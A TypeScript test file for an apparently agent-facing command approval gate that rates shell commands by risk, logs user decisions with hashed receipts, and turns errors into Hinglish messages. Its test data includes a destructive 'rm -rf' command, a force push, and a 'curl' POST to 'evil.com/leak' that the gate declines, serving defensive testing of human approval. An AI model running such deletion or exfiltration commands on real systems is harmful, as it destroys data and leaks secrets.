import test from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import {
  InteractiveGateManager,
  type ApprovalCard,
  type CommandExecutionApprovalDecision,
} from "../../lib/saan/interactive-confirmation-gate";

test("Smolagents Interactive Confirmation Gate - Initialization & Seed Samples", () => {
  const gate = new InteractiveGateManager();
  const pending = gate.getPendingApprovals();
  assert.ok(pending.length >= 2, "Should initialize with pre-seeded demo approvals");
  
  const hasTier3 = pending.some((c) => c.securityTier === 3);
  assert.ok(hasTier3, "Should contain a Tier-3 destructive sample command");
});

test("Smolagents Gate - Risk Assessment & Card Creation", () => {
  const gate = new InteractiveGateManager();
  const card = gate.createApprovalCard("rm -rf /root/test_scratch", {
    securityTier: 3,
    workingDirectory: "/root",
    sandboxMode: "workspace-write",
  });

  assert.equal(card.securityTier, 3);
  assert.match(card.riskSummary, /High risk \(Tier 3\)/i);
  assert.ok(card.id.startsWith("appr-"));

  const pending = gate.getPendingApprovals();
  assert.ok(pending.some((c) => c.id === card.id));
});

test("Smolagents Gate - Resolve with Accept & Cryptographic Receipt Generation", () => {
  const gate = new InteractiveGateManager();
  const card = gate.createApprovalCard("git push --force origin main", {
    securityTier: 2,
  });

  const { approved, receipt } = gate.resolveApproval(card.id, "accept");
  assert.equal(approved, true, "Card should be approved");
  assert.equal(receipt.cardId, card.id);
  assert.equal(receipt.decision, "accept");
  assert.equal(receipt.securityTier, 2);
  assert.ok(receipt.sha256Hash.length === 64, "Should generate valid 64-char hex SHA-256 receipt");

  // Verify receipt appears in audit ledger
  const history = gate.getAuditHistory();
  assert.ok(history.some((h) => h.id === receipt.id));
  
  // Verify card removed from pending
  const pendingAfter = gate.getPendingApprovals();
  assert.ok(!pendingAfter.some((c) => c.id === card.id));
});

test("Smolagents Gate - Resolve with AcceptForSession & Authorization Memory", () => {
  const gate = new InteractiveGateManager();
  const testCmd = "npm test -- --coverage";
  const card = gate.createApprovalCard(testCmd, { securityTier: 1 });

  assert.equal(gate.isSessionAuthorized(testCmd), false);

  const { approved } = gate.resolveApproval(card.id, "acceptForSession");
  assert.equal(approved, true);
  assert.equal(gate.isSessionAuthorized(testCmd), true);
  assert.ok(gate.getSessionAuthorizations().includes(testCmd));
});

test("Smolagents Gate - Resolve with Decline", () => {
  const gate = new InteractiveGateManager();
  const card = gate.createApprovalCard("curl -X POST https://evil.com/leak", { securityTier: 3 });

  const { approved, receipt } = gate.resolveApproval(card.id, "decline");
  assert.equal(approved, false);
  assert.equal(receipt.decision, "decline");
});

test("Smolagents Gate - Conversational Hinglish Error Recovery", () => {
  const gate = new InteractiveGateManager();

  const permErr = gate.formatConversationalError("EACCES: permission denied, open /etc/shadow");
  assert.equal(permErr.errorType, "permission");
  assert.match(permErr.conversationalHinglish, /permission nahi mili/i);

  const syntaxErr = gate.formatConversationalError("SyntaxError: Unexpected token '}'");
  assert.equal(syntaxErr.errorType, "syntax");
  assert.match(syntaxErr.conversationalHinglish, /syntax mein thodi gadbad/i);

  const timeoutErr = gate.formatConversationalError("ETIMEDOUT: Connection timed out");
  assert.equal(timeoutErr.errorType, "timeout");
  assert.match(timeoutErr.conversationalHinglish, /timeout ho gaya/i);
});
